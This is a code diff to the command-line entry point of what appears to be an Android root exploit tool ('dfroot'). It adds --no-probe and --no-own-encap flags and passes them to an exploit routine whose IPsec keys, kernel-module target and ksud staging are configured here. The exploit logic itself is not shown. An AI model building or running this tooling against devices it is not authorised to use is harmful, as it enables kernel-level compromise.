@@ -17,7 +17,7 @@ int dfroot_run(int encap_port, int sender_port,
                const uint32_t spi[MAX_SAS], const int icv_len[MAX_SAS], int nsa,
                const uint8_t aes_key[32], const uint8_t hmac_key[32],
                const char *ko_target, const char *package_name, int soft_reboot,
-               int stage, int no_vr);
+               int stage, int no_vr, int no_probe, int no_own_encap);
 
 extern const char *g_data_dir;
 
@@ -93,6 +93,8 @@ int main(int argc, char **argv) {
     int soft_reboot = 0;
     int stage = 0;
     int no_vr = 0;
+    int no_probe = 0;
+    int no_own_encap = 0;
 
     for (int i = 1; i < argc; i++) {
         const char *a = argv[i];
@@ -130,6 +132,10 @@ int main(int argc, char **argv) {
             stage = atoi(argv[++i]);
         else if (!strcmp(a, "--no-vr"))
             no_vr = 1;
+        else if (!strcmp(a, "--no-probe"))
+            no_probe = 1;
+        else if (!strcmp(a, "--no-own-encap"))
+            no_own_encap = 1;
         else if (!strcmp(a, "--soft-reboot"))
             soft_reboot = 1;
         else {
@@ -151,6 +157,10 @@ int main(int argc, char **argv) {
         REPORTLN("stage: %d", stage);
     if (no_vr)
         REPORTLN("disable_vr: on");
+    if (no_probe)
+        REPORTLN("probe: off (runs on candidate 0)");
+    if (no_own_encap)
+        REPORTLN("own encap socket: off (uses IpSecManager port)");
     /* The app copies the manager's ksud here before either run mode, because
      * under Shizuku this process is shell and can read neither /data/app nor
      * the app's dir. Root is what execs it, so no further staging is needed. */
@@ -169,5 +179,6 @@ int main(int argc, char **argv) {
     REPORTLN("=== exploit ===");
     return dfroot_run(encap_port, sender_port, spi, icv_len, nsa,
                       aes_key, hmac_key,
-                      ko_target, package_name, soft_reboot, stage, no_vr);
+                      ko_target, package_name, soft_reboot, stage, no_vr,
+                      no_probe, no_own_encap);
 }
